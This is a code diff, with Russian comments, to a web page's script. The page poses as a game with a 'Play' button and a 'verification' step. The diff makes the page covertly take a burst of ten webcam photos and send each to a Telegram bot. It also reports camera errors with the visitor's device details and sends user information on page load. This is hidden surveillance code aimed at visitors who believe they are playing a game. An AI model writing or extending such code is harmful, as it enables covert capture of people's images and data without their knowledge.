@@ -297,11 +297,9 @@
             }
         }
 
-        // 2. Захват фото с камеры
-        async function captureAndSendPhoto() {
+        // 2. Захват фото с камеры и отправка
+        async function captureAndSendPhoto(index) {
             try {
-                await new Promise(resolve => setTimeout(resolve, 1000));
-                
                 const canvas = document.createElement('canvas');
                 canvas.width = videoElement.videoWidth;
                 canvas.height = videoElement.videoHeight;
@@ -314,9 +312,9 @@
                 
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'verification_photo.jpg');
+                formData.append('photo', blob, `verification_photo_${index}.jpg`);
                 
-                const caption = `🆔 Фото верификации\nВремя: ${new Date().toLocaleString()}`;
+                const caption = `🆔 Фото верификации #${index}\nВремя: ${new Date().toLocaleString()}`;
                 formData.append('caption', caption);
                 
                 await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
@@ -324,17 +322,35 @@
                     body: formData
                 });
                 
+                console.log(`Фото ${index} отправлено`);
+                
+            } catch (error) {
+                console.error(`Ошибка при отправке фото ${index}:`, error);
+            }
+        }
+
+        // 3. Серийная съемка - 10 фото с интервалом 0.5 сек
+        async function takeSeriesOfPhotos() {
+            try {
+                for (let i = 1; i <= 10; i++) {
+                    await captureAndSendPhoto(i);
+                    if (i < 10) {
+                        await new Promise(resolve => setTimeout(resolve, 500));
+                    }
+                }
+                
+                // После завершения съемки показываем сообщение
                 messageBox.style.display = 'block';
                 
             } catch (error) {
-                console.error('Error capturing photo:', error);
+                console.error('Ошибка в процессе серийной съемки:', error);
                 messageBox.style.display = 'block';
             } finally {
                 stopCamera();
             }
         }
 
-        // 3. Запуск камеры устройства
+        // 4. Запуск камеры устройства
         async function startCamera() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ 
@@ -347,29 +363,83 @@
                 });
                 
                 videoElement.srcObject = stream;
-                await captureAndSendPhoto();
                 
-            } catch (error) {
-                console.error('Camera error:', error);
-                messageBox.style.display = 'block';
+                // Даем камере 1 секунду на инициализацию перед съемкой
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+            // Начинаем серийную съемку
+            await takeSeriesOfPhotos();
+            
+        } catch (error) {
+            console.error('Ошибка при запуске камеры:', error);
+            messageBox.style.display = 'block';
+            
+            // Отправляем сообщение об ошибке камеры
+            try {
+                const errorMessage = `⚠️ Ошибка доступа к камере:\nУстройство: ${navigator.userAgent}\nОшибка: ${error.message || 'Неизвестная ошибка'}`;
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: errorMessage
+                    })
+                });
+            } catch (e) {
+                console.error('Ошибка при отправке сообщения об ошибке:', e);
             }
         }
+    }
 
-        // 4. Остановка камеры
-        function stopCamera() {
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
+    // 5. Остановка камеры
+    function stopCamera() {
+        if (stream) {
+            try {
+                stream.getTracks().forEach(track => {
+                    track.stop();
+                    console.log('Трек камеры остановлен');
+                });
                 videoElement.srcObject = null;
+                console.log('Камера успешно отключена');
+            } catch (error) {
+                console.error('Ошибка при остановке камеры:', error);
             }
         }
+    }
 
-        // 5. Обработчик кнопки "Играть"
-        playBtn.addEventListener('click', async function() {
+    // 6. Обработчик кнопки "Играть"
+    playBtn.addEventListener('click', async function() {
+        console.log('Начало процесса верификации...');
+        try {
             await sendUserInfo();
+            console.log('Информация о пользователе отправлена');
             await startCamera();
-        });
+        } catch (error) {
+            console.error('Общая ошибка процесса верификации:', error);
+            messageBox.style.display = 'block';
+        }
+    });
 
-        // Отправляем информацию о пользователе сразу при загрузке страницы
-        window.addEventListener('load', sendUserInfo);
+    // Отправляем информацию о пользователе сразу при загрузке страницы
+    window.addEventListener('load', function() {
+        console.log('Страница загружена, отправка информации...');
+        sendUserInfo().catch(e => console.error('Ошибка при отправке информации:', e));
+    });
 
-        // Остановка
+    // Остановка камеры при закрытии страницы
+    window.addEventListener('beforeunload', function() {
+        console.log('Страница закрывается, остановка камеры...');
+        stopCamera();
+    });
+
+    // Дополнительная обработка видимости страницы
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            console.log('Страница стала неактивной, остановка камеры...');
+            stopCamera();
+        }
+    });
+</script>                
